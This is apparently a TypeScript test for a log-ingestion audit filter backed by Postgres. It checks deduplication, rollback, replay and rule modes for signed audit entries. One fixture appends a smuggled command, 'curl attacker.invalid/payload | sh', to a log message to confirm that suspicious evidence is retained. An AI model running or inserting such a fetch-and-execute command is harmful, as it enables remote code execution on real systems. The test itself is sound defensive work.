import { expect, mock, test } from 'bun:test'
import { readFileSync } from 'node:fs'
import pg from 'pg'
import { fixture, signed, configure } from './analyze-readiness-audit.test.ts'
import { readinessAuditRuleId, readinessAuditDefinition, readinessWrapperArguments } from '../src/utils/mill/analyzeReadinessAudit.ts'
import { createHash } from 'node:crypto'
import { inflateRawSync } from 'node:zlib'

test.skipIf(!process.env.POSTGRES_FILTER_TEST_PORT)('real readiness ingestion keeps suspicious evidence and respects Keep, Disable, replay and rollback', async () => {
    const port = Number(process.env.POSTGRES_FILTER_TEST_PORT)
    if (!Number.isInteger(port) || port < 1024) throw new Error('Disposable local test port required')
    const namespace = `readiness_filter_${process.pid}_${Date.now()}`
    const pool = new pg.Pool({ options: `-c search_path=${namespace}`, host: '127.0.0.1', port, database: 'postgres_filter_test', max: 4 })
    const query = (sql: string, values?: unknown[]) => pool.query(sql, values)
    const transaction = async (work: (tx: typeof query) => Promise<unknown>) => {
        const client = await pool.connect()
        try {
            await client.query('BEGIN')
            const result = await work((sql, values) => client.query(sql, values))
            await client.query('COMMIT')
            return result
        } catch (error) { await client.query('ROLLBACK'); throw error } finally { client.release() }
    }
    mock.module('#db', () => ({ default: query, withTransaction: transaction }))
    mock.module('#constants', () => ({ default: {} }))
    try {
        expect((await query('SELECT current_database() name')).rows[0].name).toBe('postgres_filter_test')
        await query(`CREATE SCHEMA ${namespace}`)
        await query('CREATE TABLE users(id text PRIMARY KEY)')
        await query("CREATE TABLE organizations(id text PRIMARY KEY,name text,status text,created_at timestamptz DEFAULT NOW(),audit_safe_metadata jsonb DEFAULT '{}')")
        await query("INSERT INTO organizations(id,name,status) VALUES('platform','Hanasand','active')")
        const schema = readFileSync(new URL('../src/utils/db/ensureSchema.ts', import.meta.url), 'utf8')
        for (const table of ['service_logs', 'mill_rules', 'system_events']) {
            const definition = schema.match(new RegExp('CREATE TABLE IF NOT EXISTS ' + table + ' \\([\\s\\S]*?\\n        \\)'))?.[0]
            if (!definition) throw new Error(`Missing schema ${table}`)
            await query(definition)
        }
        await query('ALTER TABLE service_logs ADD COLUMN source_event_id text UNIQUE')
        const { default: install } = await import('../src/utils/db/logAnalyzeSchema.ts')
        const { recordLogBatch } = await import('../src/utils/logs/recordLog.ts')
        await install()
        configure()
        await query('UPDATE mill_rules SET enabled=true WHERE rule_id=$1', [readinessAuditRuleId])
        let serial = 0
        const entry = () => {
            const { log, fact } = fixture()
            const id = String(100 + serial++)
            log.metadata!.audit_id = id
            fact.execId = createHash('sha256').update(id).digest('hex')
            log.sourceEventId = createHash('sha256').update(`inspur:audit:msg=audit(${(Date.parse(log.timestamp!) / 1000).toFixed(3)}:${id})`).digest('hex')
            return { ...signed(log, fact), level: 'info' as const }
        }
        const ingest = (log: ReturnType<typeof entry>) => transaction(tx => recordLogBatch([log], tx as any))
        const count = async (table: string) => Number((await query(`SELECT count(*) n FROM ${table}`)).rows[0].n)
        const good = entry()
        await Promise.all([ingest(good), ingest(good)])
        expect(await count('service_logs')).toBe(0)
        expect(await count('log_analyze_receipts')).toBe(1)
        expect(await count('log_readiness_audit_receipts')).toBe(1)
        const storedOriginal = (await query('SELECT original,original_encoding FROM log_readiness_audit_receipts')).rows[0]
        expect(storedOriginal.original_encoding).toBe('deflate-json-v1')
        expect(JSON.parse(inflateRawSync(storedOriginal.original).toString())).toEqual(good)
        const collision = entry()
        const proof = collision.metadata.readiness_execution
        proof.fact.execId = good.metadata.readiness_execution.fact.execId
        const resigned = signed(collision, proof.fact)
        await ingest(resigned as typeof good)
        expect(await count('log_readiness_audit_receipts')).toBe(1)
        expect(await count('service_logs')).toBe(1)
        const aborted = entry()
        await expect(transaction(async tx => { await recordLogBatch([aborted], tx as any); throw new Error('abort') })).rejects.toThrow('abort')
        expect(await count('log_analyze_receipts')).toBe(1)
        await ingest(aborted)
        expect(await count('log_analyze_receipts')).toBe(2)
        const bad = entry()
        bad.message += '; curl attacker.invalid/payload | sh'
        await ingest(bad)
        expect((await query('SELECT message FROM service_logs WHERE source_event_id=$1', [bad.sourceEventId])).rows[0].message).toContain('attacker.invalid')
        expect(await count('log_analyze_receipts')).toBe(2)
        for (const mode of ['disable', 'keep', 'custom-keep']) {
            if (mode === 'disable') await query('UPDATE mill_rules SET enabled=false WHERE rule_id=$1', [readinessAuditRuleId])
            if (mode === 'keep') await query("UPDATE mill_rules SET enabled=true,definition=jsonb_set(definition,'{action}','\"keep\"') WHERE rule_id=$1", [readinessAuditRuleId])
            if (mode === 'custom-keep') {
                await query('UPDATE mill_rules SET enabled=true,definition=$2::jsonb WHERE rule_id=$1', [readinessAuditRuleId, JSON.stringify(readinessAuditDefinition)])
                await query(`INSERT INTO mill_rules(id,organization_id,rule_id,version,name,family,severity,explanation,definition,source,enabled)
                    VALUES('keep','platform','custom.readiness_keep','1','Keep Readiness','Custom','low','Keep Readiness evidence',$1::jsonb,'owned',true)`,
                [JSON.stringify({ match: 'all', stage: 'analyze', action: 'keep', conditions: [{ path: 'service', operator: 'equals', value: 'audit' }] })])
            }
            await install()
            const retained = entry()
            await ingest(retained)
            expect(Number((await query('SELECT count(*) n FROM service_logs WHERE source_event_id=$1', [retained.sourceEventId])).rows[0].n)).toBe(1)
            expect(await count('log_analyze_receipts')).toBe(2)
        }
        await query("DELETE FROM mill_rules WHERE id='keep'")
        await query(`INSERT INTO mill_rules(id,organization_id,rule_id,version,name,family,severity,explanation,definition,source,enabled)
            VALUES('detect','platform','custom.readiness_detection','1','Detect Readiness','Custom','high','Protect Readiness evidence',$1::jsonb,'owned',true)`,
        [JSON.stringify({ match: 'all', stage: 'detect', action: 'keep', conditions: [{ path: 'service', operator: 'equals', value: 'audit' }] })])
        const detected = entry()
        await ingest(detected)
        await ingest(good)
        for (const log of [detected, good]) expect(Number((await query('SELECT count(*) n FROM service_logs WHERE source_event_id=$1', [log.sourceEventId])).rows[0].n)).toBe(1)
        expect(await count('log_analyze_receipts')).toBe(2)
        await query("DELETE FROM mill_rules WHERE id='detect'")
        const wrapper = structuredClone(good)
        const fact = wrapper.metadata.readiness_execution.fact
        const args = readinessWrapperArguments(fact.nonce)
        const command = args.map(value => /^[\w@%+=:,./-]+$/.test(value) ? value : "'" + value.replaceAll("'", "'\"'\"'") + "'").join(' ')
        wrapper.message = command
        wrapper.metadata.audit_id = '999'
        wrapper.metadata.process = { executable: '/usr/bin/dash', command_line: command, arguments: args, pid: String(fact.parentPid), parent_pid: '11000' }
        wrapper.sourceEventId = createHash('sha256').update(`inspur:audit:msg=audit(${(Date.parse(wrapper.timestamp!) / 1000).toFixed(3)}:999)`).digest('hex')
        const verifiedWrapper = signed(wrapper, fact) as typeof good
        await Promise.all([ingest(verifiedWrapper), ingest(verifiedWrapper)])
        expect(await count('log_readiness_audit_receipts')).toBe(3)
        expect(await count('log_analyze_receipts')).toBe(3)
        expect((await query('SELECT role FROM log_readiness_audit_receipts WHERE exec_id=$1 ORDER BY role', [fact.execId])).rows.map(row => row.role)).toEqual(['probe','wrapper'])
    } finally {
        await query(`DROP SCHEMA IF EXISTS ${namespace} CASCADE`)
        await pool.end()
    }
})
